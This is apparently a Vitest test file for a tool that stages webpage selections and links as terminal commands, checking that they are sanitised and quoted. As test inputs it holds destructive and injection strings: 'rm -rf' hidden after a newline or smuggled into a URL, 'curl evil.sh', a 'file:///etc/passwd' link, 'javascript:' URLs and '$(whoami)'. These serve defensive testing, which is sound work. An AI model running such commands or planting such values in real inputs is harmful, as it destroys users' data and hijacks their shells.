import { describe, expect, it } from 'vitest';
import { buildAction, cloneUrlFor, prepareSelection, shellQuote } from './cross-actions.js';

const ESC = '\u001b';
const NUL = '\u0000';

describe('preparing a selection from a webpage', () => {
  it('keeps an ordinary command as it was written', () => {
    expect(prepareSelection('npm install --save-dev vitest')).toBe('npm install --save-dev vitest');
  });

  it('collapses newlines rather than letting them run a second command', () => {
    // The attack this exists for: a page shows one command and hides another after a newline.
    const staged = prepareSelection('echo hello\nrm -rf ~/Documents');
    expect(staged).not.toContain('\n');
    expect(staged).toBe('echo hello rm -rf ~/Documents');
  });

  it('collapses a carriage return too', () => {
    expect(prepareSelection('echo a\r\ncurl evil.sh')).not.toMatch(/[\r\n]/);
  });

  it('strips control characters that could rewrite what is displayed', () => {
    // Showing the user what they are about to run is the whole mechanism. An escape sequence
    // could make the display disagree with the text.
    expect(prepareSelection(`echo ${ESC}[2Ksafe`)).toBe('echo [2Ksafe');
  });

  it('strips a null byte', () => {
    expect(prepareSelection(`echo a${NUL}b`)).toBe('echo ab');
  });

  it('rejects a selection with nothing in it', () => {
    expect(prepareSelection('   \n  ')).toBeNull();
  });

  it('caps an enormous selection', () => {
    expect(prepareSelection('x'.repeat(10_000))?.length).toBe(4000);
  });
});

describe('recognising a repository page', () => {
  it('builds a clone URL from a repository root', () => {
    expect(cloneUrlFor('https://github.com/owner/repo')).toBe('https://github.com/owner/repo.git');
  });

  it('ignores the rest of a deep URL', () => {
    expect(cloneUrlFor('https://github.com/owner/repo/pull/42/files')).toBe(
      'https://github.com/owner/repo.git',
    );
  });

  it('handles the other common hosts', () => {
    expect(cloneUrlFor('https://gitlab.com/a/b')).toBe('https://gitlab.com/a/b.git');
    expect(cloneUrlFor('https://codeberg.org/a/b')).toBe('https://codeberg.org/a/b.git');
  });

  it('does not treat a settings page as a repository', () => {
    expect(cloneUrlFor('https://github.com/settings/profile')).toBeNull();
  });

  it('refuses a host it does not know', () => {
    // Otherwise any page could offer itself as something to clone.
    expect(cloneUrlFor('https://evil.example/owner/repo')).toBeNull();
  });

  it('refuses plain http and non-web schemes', () => {
    expect(cloneUrlFor('http://github.com/a/b')).toBeNull();
    expect(cloneUrlFor('javascript:alert(1)')).toBeNull();
  });

  it('refuses a path that is not a plain owner and repo', () => {
    expect(cloneUrlFor('https://github.com/owner')).toBeNull();
    expect(cloneUrlFor('https://github.com/ow;ner/re po')).toBeNull();
  });
});

describe('building an action', () => {
  it('stages a selection with no trailing newline, so nothing runs', () => {
    const a = buildAction('send-selection', { selectionText: 'ls -la', pageUrl: 'https://x.test' });
    expect(a?.text).toBe('ls -la');
    expect(a?.text.endsWith('\n')).toBe(false);
  });

  it('quotes a URL rather than trusting it', () => {
    const a = buildAction('open-url', { linkUrl: "https://x.test/a'; rm -rf ~; echo '" });
    expect(a?.text).toContain(`'\\''`);
    expect(a?.text.endsWith('\n')).toBe(false);
  });

  it('refuses a link scheme a terminal has no business with', () => {
    expect(buildAction('open-url', { linkUrl: 'file:///etc/passwd' })).toBeNull();
    expect(buildAction('open-url', { linkUrl: 'javascript:alert(1)' })).toBeNull();
  });

  it('builds a clone command for a repository page', () => {
    expect(buildAction('clone-repo', { pageUrl: 'https://github.com/o/r' })?.text).toBe(
      "git clone 'https://github.com/o/r.git'",
    );
  });

  it('returns nothing when there is nothing to act on', () => {
    expect(buildAction('send-selection', {})).toBeNull();
    expect(buildAction('clone-repo', { pageUrl: 'https://example.com' })).toBeNull();
  });

  it('never produces a command that ends in a newline', () => {
    // A trailing newline is the difference between staging and running.
    const all = [
      buildAction('send-selection', { selectionText: 'a' }),
      buildAction('open-url', { linkUrl: 'https://x.test' }),
      buildAction('clone-repo', { pageUrl: 'https://github.com/o/r' }),
    ];
    for (const a of all) expect(a?.text).not.toMatch(/[\r\n]/);
  });
});

describe('shell quoting', () => {
  it('closes and reopens the quote around an embedded one', () => {
    expect(shellQuote("a'b")).toBe(`'a'\\''b'`);
  });

  it('leaves metacharacters inert inside the quotes', () => {
    expect(shellQuote('$(whoami)')).toBe(`'$(whoami)'`);
  });
});
